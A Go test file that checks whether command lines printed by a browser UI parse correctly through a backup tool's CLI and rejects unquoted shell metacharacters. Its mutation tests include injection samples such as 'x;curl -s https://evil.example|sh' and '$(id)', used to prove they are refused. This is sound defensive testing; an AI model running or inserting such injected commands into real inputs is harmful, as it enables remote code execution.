package main

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

// The browser's own command twins, fed through the real dispatcher (issue
// #1253).
//
// TestEveryEchoedCommandParses covers every line core/cliecho prints, and
// that is the terminal's half. The other half is printed by the browser
// before any request is made, beside the control, by the twin modules
// under ui/shared/src (every file named *Commands.ts). Those were only
// ever compared with strings their own tests spelled out, so a flag the
// CLI never had could sit in both the builder and its test and be green:
// the destination wizard printed `medium add --backend` that way until
// #1252.
//
// ui/shared/src/test/cliTwins.test.ts writes every line those modules
// print, for a fixed set of inputs, to testdata/ui_twins.json. This reads
// the file and runs each line the way the test above runs cliecho's:
// through `run`, with --config pointing at a file that won't load, so a
// line the parser accepts exits 1 and a line it refuses exits 2.
//
// # Stale fixtures
//
// The fixture records the sha256 of each source that shapes it, and this
// recomputes them. The local gate runs the Go suites before vitest and can
// skip vitest altogether, so without this a twin changed and committed
// without a re-pin would be checked here against its old lines and pass.
//
// # What a line may contain
//
// A browser line is meant for a person, and it can carry two things a
// shell would read differently from the argv it stands for: a
// <placeholder> where the browser has no value yet (or withholds one),
// and a `> file` redirect where a download goes. A placeholder is swapped
// for a stand-in of the right shape and the redirect is dropped, because
// what this checks is the verb and its flags. Every placeholder needs a
// stand-in written down below, so a new one is a decision rather than a
// guess.
//
// Anything else a shell treats specially (; | & $ ` ( ) { } * ? !) is a
// failure when it isn't quoted. The first version of this reader took
// those as ordinary characters, so a twin that forgot to quote an id
// passed as long as the id had no space in it, and `retnd assurance show
// x;curl ...|sh` was certified as a line to copy.

const uiTwins = "testdata/ui_twins.json"

const uiTwinsRepin = "npx vitest run -u src/test/cliTwins.test.ts (from ui/shared)"

// repoRoot is where the fixture's source paths are relative to.
const repoRoot = "../../.."

type uiTwinFile struct {
	About   string         `json:"about"`
	Sources []uiTwinSource `json:"sources"`
	Twins   []uiTwin       `json:"twins"`
}

type uiTwinSource struct {
	Path   string `json:"path"`
	SHA256 string `json:"sha256"`
}

type uiTwin struct {
	Module string `json:"module"`
	Fn     string `json:"fn"`
	Case   string `json:"case"`
	Line   string `json:"line"`
}

// placeholderStandIns is what each <placeholder> the browser prints is
// replaced with before the line is parsed: a value of the shape the flag
// takes, so a flag that checks its value while parsing sees a real one.
var placeholderStandIns = map[string]string{
	"date":        "2026-10-01",
	"duration":    "24h",
	"dir":         "/srv/restored",
	"directory":   "/srv/restored",
	"destination": "restore",
	"id":          "offsite_s3",
	"name":        "restore",
	"the command that prints these credentials":                        "credential-helper",
	"the value, left out because it looks like it carries credentials": "https://s3.example.test",
}

// shellSpecial is what a shell reads as something other than a word
// character, outside quotes.
const shellSpecial = ";|&$`(){}*?!"

// readTwinLine turns one browser line into the argv it stands for.
//
// It reads what the TypeScript shellQuote writes (bare words, and single
// quotes with a backslash-escaped quote between two quoted runs for an
// embedded quote) plus the two things a twin can carry that a cliecho
// line can't: an unquoted <placeholder>, which may have spaces in it and
// may sit inside a word (medium:<id>), and one unquoted `>` redirect at
// the end, which is dropped along with its target. A placeholder with no
// stand-in is returned in unknown, and anything a shell would act on is
// returned in problems.
func readTwinLine(line string) (argv, unknown, problems []string) {
	var (
		cur        strings.Builder
		inWord     bool
		quoted     bool
		redirected bool // a > has been read
		target     bool // the word being read is the redirect's target
		afterRedir bool // the target has been read
	)
	flush := func() {
		if !inWord {
			return
		}
		switch {
		case target:
			target, afterRedir = false, true
		case afterRedir:
			problems = append(problems, "a word after the redirect: "+cur.String())
		default:
			argv = append(argv, cur.String())
		}
		cur.Reset()
		inWord = false
	}
	start := func() {
		if !inWord && redirected && !afterRedir && !target {
			target = true
		}
		inWord = true
	}
	for i := 0; i < len(line); i++ {
		c := line[i]
		switch {
		case quoted:
			if c == '\'' {
				quoted = false
				continue
			}
			cur.WriteByte(c)
		case c == '\'':
			start()
			quoted = true
		case c == '\\' && i+1 < len(line):
			start()
			i++
			cur.WriteByte(line[i])
		case c == '<':
			end := strings.IndexByte(line[i:], '>')
			if end < 0 {
				problems = append(problems, "an unquoted < with no closing >")
				continue
			}
			inner := line[i+1 : i+end]
			i += end
			start()
			// --field <id=value> keeps the id and stands in the value.
			if id, rest, ok := strings.Cut(inner, "="); ok {
				if v, known := placeholderStandIns[rest]; known {
					cur.WriteString(id + "=" + v)
					continue
				}
			}
			if v, known := placeholderStandIns[inner]; known {
				cur.WriteString(v)
				continue
			}
			unknown = append(unknown, "<"+inner+">")
			cur.WriteString("placeholder")
		case c == '>':
			flush()
			if redirected {
				problems = append(problems, "a second redirect")
			}
			redirected = true
		case c == ' ' || c == '\t':
			flush()
		case strings.IndexByte(shellSpecial, c) >= 0:
			problems = append(problems, "an unquoted "+string(c))
			start()
			cur.WriteByte(c)
		default:
			start()
			cur.WriteByte(c)
		}
	}
	if quoted {
		problems = append(problems, "an unterminated quote")
	}
	flush()
	if redirected && !afterRedir {
		problems = append(problems, "a redirect with no target")
	}
	return argv, unknown, problems
}

// refusedTwins runs each twin and reports the ones the dispatcher refuses
// as a bad command line, along with any a shell would read differently
// and any whose placeholder has no stand-in.
func refusedTwins(t *testing.T, twins []uiTwin, configPath string) []string {
	t.Helper()
	var out []string
	for _, tw := range twins {
		label := tw.Module + "." + tw.Fn + " (" + tw.Case + ")"
		argv, unknown, problems := readTwinLine(tw.Line)
		if len(problems) > 0 {
			out = append(out, label+": a shell would not read this as one command ("+strings.Join(problems, ", ")+"). Quote the value with shellQuote:\n  "+tw.Line)
			continue
		}
		if len(unknown) > 0 {
			out = append(out, label+": a placeholder this test has no stand-in for: "+strings.Join(unknown, ", ")+"\n  "+tw.Line+"\nAdd one to placeholderStandIns.")
			continue
		}
		if code := dispatch(t, argv, configPath); code == exitUsage {
			out = append(out, label+": refused as a bad command line (exit 2)\n  "+tw.Line)
		}
	}
	return out
}

// staleSources lists the fixture's sources whose bytes no longer hash to
// what the fixture recorded.
func staleSources(root string, sources []uiTwinSource) []string {
	var out []string
	for _, s := range sources {
		raw, err := os.ReadFile(filepath.Join(root, filepath.FromSlash(s.Path)))
		if err != nil {
			out = append(out, s.Path+" (can't be read: "+err.Error()+")")
			continue
		}
		sum := sha256.Sum256(raw)
		if hex.EncodeToString(sum[:]) != s.SHA256 {
			out = append(out, s.Path)
		}
	}
	return out
}

func readUITwins(t *testing.T) uiTwinFile {
	t.Helper()
	raw, err := os.ReadFile(uiTwins)
	if err != nil {
		t.Fatalf("reading %s: %v\nIt is written by ui/shared's vitest suite. Re-pin with: %s", uiTwins, err, uiTwinsRepin)
	}
	var file uiTwinFile
	if err := json.Unmarshal(raw, &file); err != nil {
		t.Fatalf("%s is not the fixture this test reads: %v", uiTwins, err)
	}
	return file
}

func TestEveryUITwinParses(t *testing.T) {
	clearTheRoute(t)
	file := readUITwins(t)

	if stale := staleSources(repoRoot, file.Sources); len(stale) > 0 {
		t.Errorf("%s was written from sources that have changed since:\n  %s\nThe lines below are the old ones, so parsing them proves nothing about what the browser prints now. Re-pin with: %s",
			uiTwins, strings.Join(stale, "\n  "), uiTwinsRepin)
	}

	// Vacuity, per module, read from the fixture's own list rather than
	// written here: a module that lost all its lines would otherwise be
	// unchecked and this test green.
	var modules []string
	for _, s := range file.Sources {
		if strings.HasSuffix(s.Path, "Commands.ts") {
			modules = append(modules, strings.TrimSuffix(strings.TrimPrefix(s.Path, "ui/shared/src/"), ".ts"))
		}
	}
	if len(modules) < 4 {
		t.Fatalf("%s names %d twin modules, and there were four before this test existed. Re-pin with: %s", uiTwins, len(modules), uiTwinsRepin)
	}
	for _, m := range modules {
		if !slices.ContainsFunc(file.Twins, func(tw uiTwin) bool { return tw.Module == m }) {
			t.Errorf("%s has no line from %s, so nothing here checks what that module prints. Re-pin with: %s", uiTwins, m, uiTwinsRepin)
		}
	}

	for _, refused := range refusedTwins(t, file.Twins, unparseableConfig(t)) {
		t.Errorf("the browser prints a line an operator can't paste as it stands. Fix the TypeScript twin (and re-pin with %s), or the CLI if the twin is right:\n%s", uiTwinsRepin, refused)
	}
}

// The mutations this exists for: a twin with a flag the CLI never had,
// and one that forgot to quote an id. Each has to be refused, and the
// same line done right has to get through, so the refusal is about the
// mistake and not about the reader.
func TestEveryUITwinParses_MutationsAreCaught(t *testing.T) {
	clearTheRoute(t)
	configPath := unparseableConfig(t)
	for _, tc := range []struct {
		name, bad, good string
	}{
		{"a flag `medium add` never had (the line #1252 fixed)",
			"retnd medium add offsite_s3 --backend s3 --bucket acme",
			"retnd medium add offsite_s3 --type s3 --bucket acme"},
		{"an id from a crafted link, unquoted",
			"retnd assurance show x;curl -s https://evil.example|sh",
			"retnd assurance show 'x;curl -s https://evil.example|sh'"},
		{"a command substitution, unquoted",
			"retnd assurance show $(id)",
			"retnd assurance show '$(id)'"},
		{"a placeholder nobody wrote a stand-in for",
			"retnd restore x --medium <a placeholder nobody wrote down> --acknowledge",
			"retnd restore x --medium <id> --acknowledge"},
		{"words after a redirect",
			"retnd recover a/b/c --to - > file --acknowledge-cost",
			"retnd recover a/b/c --acknowledge-cost --to - > file"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := refusedTwins(t, []uiTwin{{Module: "m", Fn: "f", Case: "bad", Line: tc.bad}}, configPath); len(got) != 1 {
				t.Errorf("not refused: %s", tc.bad)
			}
			if got := refusedTwins(t, []uiTwin{{Module: "m", Fn: "f", Case: "good", Line: tc.good}}, configPath); len(got) != 0 {
				t.Errorf("the correct form is refused too, so the case above proves nothing: %q", got)
			}
		})
	}
}

// A fixture whose source changed under it is reported.
func TestEveryUITwinParses_MutationAStaleFixtureIsCaught(t *testing.T) {
	file := readUITwins(t)
	if len(file.Sources) == 0 {
		t.Fatalf("%s records no sources", uiTwins)
	}
	if got := staleSources(repoRoot, file.Sources); len(got) != 0 {
		t.Skipf("the fixture is already stale (%v); TestEveryUITwinParses says so", got)
	}
	changed := slices.Clone(file.Sources)
	changed[0].SHA256 = strings.Repeat("0", 64)
	if got := staleSources(repoRoot, changed); !slices.Contains(got, changed[0].Path) {
		t.Errorf("a source whose hash no longer matches was not reported; got %v", got)
	}
}

// readTwinLine's own control. Every line above goes through it, so a
// reader that mangled a quote or kept a redirect would decide what the
// test sees.
func TestReadTwinLine(t *testing.T) {
	for _, tc := range []struct {
		line string
		want []string
	}{
		{"retnd scrub api-server/var-backups", []string{"retnd", "scrub", "api-server/var-backups"}},
		{"retnd snapshot hold s/a --reason 'it'\\''s evidence'", []string{"retnd", "snapshot", "hold", "s/a", "--reason", "it's evidence"}},
		{"retnd recover a/b/c --acknowledge-cost --to - > recovered-file", []string{"retnd", "recover", "a/b/c", "--acknowledge-cost", "--to", "-"}},
		{"retnd recover a/b/c --to - > 'a file'", []string{"retnd", "recover", "a/b/c", "--to", "-"}},
		{"retnd recover a/b/c --to - >file", []string{"retnd", "recover", "a/b/c", "--to", "-"}},
		{"retnd recover a/b/c --to - >'a file'", []string{"retnd", "recover", "a/b/c", "--to", "-"}},
		{"retnd recover a/b/c --to medium:<id>", []string{"retnd", "recover", "a/b/c", "--to", "medium:offsite_s3"}},
		{"retnd scrub 'x; curl -s https://evil.example|sh'", []string{"retnd", "scrub", "x; curl -s https://evil.example|sh"}},
		{"retnd medium add x --credentials-command <the command that prints these credentials>", []string{"retnd", "medium", "add", "x", "--credentials-command", "credential-helper"}},
		{"retnd medium configure c --backend s3 --field <endpoint=the value, left out because it looks like it carries credentials>", []string{"retnd", "medium", "configure", "c", "--backend", "s3", "--field", "endpoint=https://s3.example.test"}},
	} {
		got, unknown, problems := readTwinLine(tc.line)
		if len(unknown) != 0 || len(problems) != 0 || !slices.Equal(got, tc.want) {
			t.Errorf("readTwinLine(%q) = %q (unknown %q, problems %q), want %q", tc.line, got, unknown, problems, tc.want)
		}
	}
	for _, line := range []string{
		"retnd assurance show x;id",
		"retnd scrub $(id)",
		"retnd scrub `id`",
		"retnd medium remove a&b",
		"retnd recover a/b/c --to - | tee out",
		"retnd recover a/b/c && retnd scrub s/a",
		"retnd recover a/b/c --to - > a > b",
		"retnd recover a/b/c --to - >",
		"retnd scrub 'unterminated",
	} {
		if _, _, problems := readTwinLine(line); len(problems) == 0 {
			t.Errorf("readTwinLine(%q) found nothing a shell would act on", line)
		}
	}
}
